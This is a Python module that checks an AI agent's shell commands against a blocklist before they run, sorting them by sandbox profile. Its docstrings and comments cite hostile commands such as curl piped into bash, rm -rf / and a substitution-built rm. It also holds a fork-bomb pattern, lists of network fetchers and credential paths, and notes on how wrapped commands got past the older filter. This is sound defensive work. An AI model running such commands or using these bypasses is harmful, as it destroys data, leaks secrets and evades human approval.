# SPDX-FileCopyrightText: 2026 Veyllo GmbH
# SPDX-License-Identifier: AGPL-3.0-or-later
# Additional permissions and terms under AGPL Section 7: see LICENSING.md
"""Offline classification of a shell command, before anything runs.

Replaces a substring blocklist that was wrong in both directions: measured on
the old implementation, `curl http://x | bash`, `wget http://x -O- | sh`,
`rm  -rf  /` and `$(echo rm) -rf /` all passed, while `rm -rf /tmp/scratch`
was refused because the string contains `rm -rf /`.

The classifier tokenizes quote-aware, splits on the shell's own separators,
descends into command substitutions, strips transparent wrappers, and then
judges the executable and its arguments. The verdict is DATA (categories +
segments), so the confirmation dialog can show WHY a command is flagged
instead of only that it is.

Three profiles, because the lanes have different confinement:
- ``host``   - vaf/tools/host_bash.py runs unsandboxed on the machine, with
  the whole environment. Its only other control is the human approval, so the
  catastrophic set is refused outright.
- ``jailed`` - vaf/tools/bash.py runs under bubblewrap (--clearenv,
  --unshare-net, repo and secrets unmounted) or a --network none container.
  Network fetches cannot reach anything, and wiping the throwaway workspace is
  ordinary work, so only what can hurt the machine or the jail root is refused.
- ``remote`` - a command that runs on ANOTHER machine, over ssh. Setting up a
  server routinely pipes an installer into a shell (the documented Docker
  install is `curl -fsSL https://get.docker.com | sh`), and refusing it there
  only teaches `curl -o f; sh f`, which passes. So the fetch-into-shell is
  named in the dialog but not refused; the catastrophic core still is.

A command can carry another command: `bash -c '...'`, `su -c '...'`, `eval ...`
and `ssh host '...'`. The inner text is classified too, the ssh one with the
``remote`` profile, and a refusal inside refuses the whole. Without that, every
refusal above was one `bash -c` away from passing (measured: ten of ten
wrapped forms went through). The nesting has a depth limit, and past it the
command is refused, because a reviewer cannot follow it either.

This module lives in vaf/core, not next to the tools, because the confirmation
gate (vaf/core/tool_dispatch.py) renders the verdict: vaf/core importing
vaf/tools would point the dependency the wrong way round.

Stdlib-only on purpose - it is imported on the dispatch hot path.
"""
from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field
from typing import List

# Executables that read a script from stdin: the sink half of "fetch | shell".
_SHELL_SINKS = frozenset({
    "sh", "bash", "zsh", "dash", "ksh", "csh", "fish", "python", "python2",
    "python3", "perl", "ruby", "node", "php", "powershell", "pwsh",
})
# Executables that pull bytes off the network: the source half.
_NETWORK_FETCHERS = frozenset({
    "curl", "wget", "fetch", "aria2c", "http", "httpie", "nc", "ncat", "netcat",
})
# Wrappers that only decorate another command; the real executable follows.
_TRANSPARENT_WRAPPERS = frozenset({
    "sudo", "doas", "nohup", "time", "env", "command", "exec", "stdbuf",
    "nice", "ionice", "setsid", "timeout", "xargs", "builtin", "sshpass",
})
# A wrapper's options that take their value as the NEXT word. Without this the value
# was read as the executable: `sudo -u root rm -rf /` judged `root`, and passed.
_WRAPPER_VALUE_OPTIONS = {
    "sudo": {"-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "-T",
             "--user", "--group", "--host", "--prompt", "--close-from", "--chdir",
             "--role", "--type", "--other-user", "--command-timeout"},
    "doas": {"-u", "-C"},
    "env": {"-u", "-C", "-S", "--unset", "--chdir", "--split-string"},
    "stdbuf": {"-i", "-o", "-e"},
    "nice": {"-n", "--adjustment"},
    "ionice": {"-c", "-n", "-p", "-P", "-u", "--class", "--classdata"},
    "timeout": {"-s", "-k", "--signal", "--kill-after"},
    "xargs": {"-a", "-d", "-E", "-e", "-I", "-i", "-L", "-l", "-n", "-P", "-s",
              "--arg-file", "--delimiter", "--max-args", "--max-procs", "--max-chars"},
    "sshpass": {"-p", "-f", "-d", "-P"},
}
# A wrapper whose first plain word is its own argument, not the command.
_WRAPPER_LEADING_ARGUMENT = frozenset({"timeout"})     # `timeout 5 cmd`: 5 is the duration

# Executables that run a command they are GIVEN AS TEXT; the text is classified too.
_COMMAND_STRING_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh"})
# ssh's single-letter options that take a value (ssh(1) synopsis).
_SSH_VALUE_LETTERS = frozenset("BbcDEeFIiJLlmOoPpQRSWw")
# How deep `bash -c "sh -c '...'"` may nest before the command is refused as unreadable.
MAX_NESTING = 4
# Writes straight to a block device or formats one.
_DEVICE_WRITERS = frozenset({"dd", "mkfs", "fdisk", "parted", "sfdisk", "shred"})
# Reading these is a credential grab worth naming in the dialog.
_CREDENTIAL_PATHS = ("/etc/shadow", "id_rsa", "id_ed25519", ".aws/credentials",
                     ".ssh/", ".netrc", "credentials.json")

# Paths whose recursive removal is never ordinary work.
_PROTECTED_ROOTS = ("/", "/*", "/bin", "/boot", "/dev", "/etc", "/home", "/lib",
                    "/lib64", "/opt", "/proc", "/root", "/sbin", "/srv", "/sys",
                    "/usr", "/var", "~", "~/", "$HOME", "${HOME}", "c:\\", "c:/")

_FORK_BOMB_RE = re.compile(r":\s*\(\s*\)\s*\{.*\|\s*:\s*&.*\}\s*;\s*:", re.DOTALL)
_DEVICE_TARGET_RE = re.compile(r"of=/dev/(sd|nvme|hd|vd|mmcblk|disk)", re.IGNORECASE)
_REDIRECT_DEVICE_RE = re.compile(r">\s*/dev/(sd|nvme|hd|vd|mmcblk|disk)", re.IGNORECASE)
# A substitution standing where the executable belongs: start of the command,
# or right after a separator.
_SUBST_IN_CMD_POS_RE = re.compile(r"(?:^|[;&|\n]|&&|\|\|)\s*(?:\$\(|`)")

CATEGORY_REASONS = {
    "pipe_to_shell": "downloads code from the network and pipes it into a shell",
    "device_write": "writes directly to a block device or formats a filesystem",
    "fork_bomb": "is a fork bomb",
    "destructive_removal": "recursively deletes a protected system or home path",
    "network_fetch": "fetches data from the network",
    "credential_read": "reads credential material",
    "history_rewrite": "discards uncommitted work or rewrites history",
    "opaque_command": "builds the executable from a command substitution, so the "
                      "text being approved is not the text that will run",
    "nested_too_deep": "nests commands inside commands deeper than anyone can review",
}

# What each profile refuses outright. Everything else in CATEGORY_REASONS is a note.
_BLOCKING = {
    "host": ("fork_bomb", "device_write", "destructive_removal", "pipe_to_shell",
             "opaque_command", "nested_too_deep"),
    # The jail has no network and its workspace is disposable; only what reaches the
    # machine or the jail root is refused.
    "jailed": ("fork_bomb", "device_write", "destructive_removal", "opaque_command",
               "nested_too_deep"),
    # Another machine: see the module docstring for why the fetch-into-shell is only named.
    "remote": ("fork_bomb", "device_write", "destructive_removal", "opaque_command",
               "nested_too_deep"),
}


@dataclass
class CommandVerdict:
    """What the classifier found. Data, so a dialog can explain it."""
    blocked: bool = False
    reason: str = ""
    categories: List[str] = field(default_factory=list)
    segments: List[str] = field(default_factory=list)

    @property
    def warning(self) -> str:
        """Human line for categories that are noteworthy but allowed."""
        if self.blocked or not self.categories:
            return ""
        named = [CATEGORY_REASONS[c] for c in self.categories if c in CATEGORY_REASONS]
        return f"Note: this command {', and '.join(named)}." if named else ""


def _split_segments(command: str) -> List[tuple]:
    """Split on shell separators OUTSIDE quotes, descending into $( ), ` ` and ( ).

    Returns (connector, segment) pairs, where the connector says how a segment
    is joined to its predecessor: "pipe" only for a single `|`, everything else
    ("start", ";", "&&", substitution boundaries) breaks the pipeline. That
    distinction carries the whole pipe-to-shell judgement: `curl x | bash` is
    unreviewable, while `curl x > f; python parse.py` is a download followed by
    a separate, visible command (measured false positive of the first version).

    A plain `command.split("|")` would be fooled by `echo "a|b"`, and a regex
    over the whole string never sees what a substitution actually runs.

    The quotes and backslashes STAY in the segment text, and shlex takes them off
    when the segment is tokenized. Dropping them here is what hid a nested command:
    `bash -c 'rm -rf /'` became the words `bash -c rm -rf /`, so the text that
    `-c` runs was no longer one argument anyone could look at.

    A substitution inside double quotes runs like one outside them. It is entered
    with the quote remembered on the stack and the quote restored when it closes;
    before, its closing `)` was read as quoted text, so `echo "$(rm -rf /)"` was
    judged as `rm -rf /)` and passed.
    """
    segments: List[tuple] = []
    connector = "start"
    buf: List[str] = []
    quote = ""       # active quote character, "" when outside quotes
    # Nesting of $( ), ( ) and ` `. A closer entered from inside double quotes is
    # stored with the quote in front ('")', '"`') so leaving it re-enters the quote.
    depth_stack: List[str] = []
    i = 0
    n = len(command)

    def _open_substitution(closer: str) -> None:
        nonlocal connector, buf
        segments.append((connector, "".join(buf).strip()))
        connector = "sub"
        buf = []
        depth_stack.append(closer)

    def _close_substitution() -> None:
        nonlocal connector, buf, quote
        segments.append((connector, "".join(buf).strip()))
        connector = "sub"
        buf = []
        if depth_stack.pop().startswith('"'):
            quote = '"'

    while i < n:
        ch = command[i]
        nxt = command[i + 1] if i + 1 < n else ""
        if quote:
            # Inside single quotes nothing is special; inside double quotes a
            # substitution still runs, so keep descending.
            if ch == "\\" and quote == '"':
                buf.append(ch)
                if nxt:
                    buf.append(nxt)
                    i += 2
                    continue
            if ch == quote:
                buf.append(ch)
                quote = ""
            elif quote == '"' and ch == "$" and nxt == "(":
                quote = ""
                _open_substitution('")')
                i += 2
                continue
            elif quote == '"' and ch == "`":
                quote = ""
                _open_substitution('"`')
            else:
                buf.append(ch)
            i += 1
            continue
        if ch in ("'", '"'):
            buf.append(ch)
            quote = ch
            i += 1
            continue
        if ch == "\\" and nxt:
            buf.append(ch)
            buf.append(nxt)
            i += 2
            continue
        if ch == "$" and nxt == "(":
            _open_substitution(")")
            i += 2
            continue
        if ch == "`":
            if depth_stack and depth_stack[-1] in ("`", '"`'):
                _close_substitution()
            else:
                _open_substitution("`")
            i += 1
            continue
        if ch == "(":
            _open_substitution(")")
            i += 1
            continue
        if ch == ")" and depth_stack and depth_stack[-1] in (")", '")'):
            _close_substitution()
            i += 1
            continue
        if ch in ";\n&|":
            segments.append((connector, "".join(buf).strip()))
            buf = []
            # && and || are one separator, not two - and only a SINGLE | is a
            # pipe; || is sequencing like ; and &&.
            if nxt == ch:
                connector = "seq"
                i += 2
                continue
            connector = "pipe" if ch == "|" else "seq"
            i += 1
            continue
        buf.append(ch)
        i += 1
    segments.append((connector, "".join(buf).strip()))
    return [(c, seg) for c, seg in segments if seg]


def _tokens(segment: str) -> List[str]:
    """shlex tokens, falling back to whitespace split on unbalanced quotes."""
    try:
        return shlex.split(segment, posix=True)
    except ValueError:
        return segment.split()


def _executable_at(tokens: List[str]) -> tuple:
    """(index, name) of the real executable: wrappers, their options (with the values
    those options take) and VAR=value prefixes are stepped over. (-1, "") for none."""
    wrapper = ""
    leading_argument_due = False
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        base = tok.rsplit("/", 1)[-1].lower()
        if not base:
            i += 1
            continue
        if tok.startswith("-"):
            # `-u root` takes the next word; `-uroot` and `--user=root` carry it along.
            if tok in _WRAPPER_VALUE_OPTIONS.get(wrapper, ()):
                i += 2
                continue
            i += 1
            continue
        if "=" in tok and tok.split("=", 1)[0].isidentifier():
            i += 1
            continue  # VAR=value prefix
        if leading_argument_due:
            leading_argument_due = False
            i += 1
            continue
        if base in _TRANSPARENT_WRAPPERS:
            wrapper = base
            leading_argument_due = base in _WRAPPER_LEADING_ARGUMENT
            i += 1
            continue
        return i, base
    return -1, ""


def _executable(tokens: List[str]) -> str:
    """The real executable's name (see _executable_at)."""
    return _executable_at(tokens)[1]


def _ssh_remote_command(args: List[str]) -> str:
    """What `ssh [options] host [command...]` runs on the other machine: every word after
    the host, joined with spaces - which is exactly how ssh itself builds it."""
    i = 0
    while i < len(args):
        tok = args[i]
        if tok == "--":
            i += 1
            break
        if not tok.startswith("-") or tok == "-":
            break
        # A cluster like `-tt`, `-4v` or `-p22`: the first value-taking letter consumes
        # the rest of the word, or the next word when it ends the cluster.
        takes_next = False
        for pos, letter in enumerate(tok[1:], start=1):
            if letter in _SSH_VALUE_LETTERS:
                takes_next = pos == len(tok) - 1
                break
        i += 2 if takes_next else 1
    return " ".join(args[i + 1:])     # args[i] is the host


def _nested_commands(exe: str, args: List[str]) -> List[tuple]:
    """(where, text) for every command this one runs from TEXT it is given: "local" for
    `sh -c`, `su -c` and `eval`, "remote" for `ssh host ...`."""
    if exe in _COMMAND_STRING_SHELLS:
        for pos, tok in enumerate(args):
            if tok in ("-o", "+o"):           # `bash -o pipefail -c ...`: -o takes a word
                continue
            if tok.startswith("-") and not tok.startswith("--") and "c" in tok[1:]:
                return [("local", args[pos + 1])] if pos + 1 < len(args) else []
        return []
    if exe == "su":
        for pos, tok in enumerate(args):
            if tok in ("-c", "--command") and pos + 1 < len(args):
                return [("local", args[pos + 1])]
            if tok.startswith("--command="):
                return [("local", tok.split("=", 1)[1])]
        return []
    if exe == "eval":
        return [("local", " ".join(args))] if args else []
    if exe == "ssh":
        remote = _ssh_remote_command(args)
        return [("remote", remote)] if remote.strip() else []
    return []


def _is_protected_target(arg: str) -> bool:
    """True when a recursive delete would hit a system or home root."""
    a = arg.strip().strip("'\"").rstrip("/") or "/"
    a_low = a.lower()
    if a in ("/", "/*", "~", "$HOME", "${HOME}") or a_low in ("c:", "c:\\"):
        return True
    for root in _PROTECTED_ROOTS:
        r = root.rstrip("/")
        if not r or r in ("~", "$HOME", "${HOME}"):
            continue
        # /usr and /usr/* are protected, /usr-local-backup is not.
        if a_low == r.lower() or a_low.startswith(r.lower() + "/") and a_low.count("/") <= 2:
            return True
    if a.startswith("~/") and a.count("/") <= 1:
        return True
    return False


def classify_command(command: str, *, profile: str = "host", _depth: int = 0) -> CommandVerdict:
    """Classify a shell command offline. Never raises, never executes anything.

    profile="host"   - unsandboxed lane: refuse the catastrophic set.
    profile="jailed" - bubblewrap/container lane: refuse only what escapes the
                       jail or hurts the machine.
    profile="remote" - runs on another machine: the host set minus the fetch into
                       a shell, which is named instead (module docstring).
    """
    verdict = CommandVerdict()
    text = (command or "").strip()
    if not text:
        return verdict
    if _depth > MAX_NESTING:
        verdict.blocked = True
        verdict.categories = ["nested_too_deep"]
        verdict.reason = ("Command contains a forbidden pattern: it "
                          + CATEGORY_REASONS["nested_too_deep"])
        return verdict

    pairs = _split_segments(text)
    verdict.segments = [seg for _, seg in pairs]
    # `$(echo rm) -rf /` reads as harmless and executes as `rm -rf /`: the
    # substitution supplies the executable, so no reader - human or classifier
    # - can tell from the text what runs.
    opaque = bool(_SUBST_IN_CMD_POS_RE.search(text))
    cats: List[str] = []

    if _FORK_BOMB_RE.search(text.replace(" ", "")) or _FORK_BOMB_RE.search(text):
        cats.append("fork_bomb")
    if opaque:
        cats.append("opaque_command")

    # What a nested command found. A refusal inside refuses the whole; a remote command's
    # categories are shown but judged by the remote profile, not by this one.
    nested_refusal = ""
    remote_cats: List[str] = []

    pipeline_fetch = False
    for connector, seg in pairs:
        # Only a pipe continues a pipeline. `curl x > f; python parse.py` is a
        # download followed by a separate, human-visible command - the block is
        # reserved for the unreviewable direct pipe into an interpreter.
        if connector != "pipe":
            pipeline_fetch = False
        toks = _tokens(seg)
        if not toks:
            continue
        exe_at, exe = _executable_at(toks)
        args = toks[exe_at + 1:] if exe_at >= 0 else []
        low = seg.lower()

        for where, inner in _nested_commands(exe, args):
            sub = classify_command(inner, profile="remote" if where == "remote" else profile,
                                   _depth=_depth + 1)
            target = remote_cats if where == "remote" else cats
            target.extend(c for c in sub.categories if c not in target)
            if sub.blocked and not nested_refusal:
                nested_refusal = sub.reason

        if exe in _NETWORK_FETCHERS:
            pipeline_fetch = True
            if "network_fetch" not in cats:
                cats.append("network_fetch")
        elif exe == "ssh":
            # What `ssh host cmd` prints is the other machine's output: piped into a
            # local shell it is code from elsewhere, like a download.
            pipeline_fetch = True
        if exe in _SHELL_SINKS and pipeline_fetch and "pipe_to_shell" not in cats:
            cats.append("pipe_to_shell")

        is_device_writer = exe in _DEVICE_WRITERS or exe.startswith("mkfs")
        if is_device_writer or _DEVICE_TARGET_RE.search(low) or _REDIRECT_DEVICE_RE.search(low):
            if exe == "dd" and not _DEVICE_TARGET_RE.search(low):
                pass  # dd on a regular file is ordinary
            elif "device_write" not in cats:
                cats.append("device_write")

        if exe == "rm":
            recursive = any(t.startswith("-") and not t.startswith("--") and "r" in t.lower()
                            for t in args) or "--recursive" in args
            targets = [t for t in args if not t.startswith("-")]
            if recursive and any(_is_protected_target(t) for t in targets):
                if "destructive_removal" not in cats:
                    cats.append("destructive_removal")

        if any(p.lower() in low for p in _CREDENTIAL_PATHS) and "credential_read" not in cats:
            cats.append("credential_read")

        if exe == "git" and ("reset --hard" in low or "clean -fd" in low or "push --force" in low):
            if "history_rewrite" not in cats:
                cats.append("history_rewrite")

    blocking = [c for c in cats if c in _BLOCKING.get(profile, _BLOCKING["host"])]
    verdict.categories = cats + [c for c in remote_cats if c not in cats]
    if blocking:
        verdict.blocked = True
        first = blocking[0]
        verdict.reason = f"Command contains a forbidden pattern: it {CATEGORY_REASONS[first]}"
    elif nested_refusal:
        verdict.blocked = True
        verdict.reason = nested_refusal
    return verdict


def is_command_safe(command: str, *, profile: str = "host") -> tuple:
    """(is_safe, message) adapter kept for the two shell tools.

    The message is the refusal reason when blocked, else a note for the
    noteworthy-but-allowed categories.
    """
    v = classify_command(command, profile=profile)
    return (not v.blocked), (v.reason if v.blocked else v.warning)
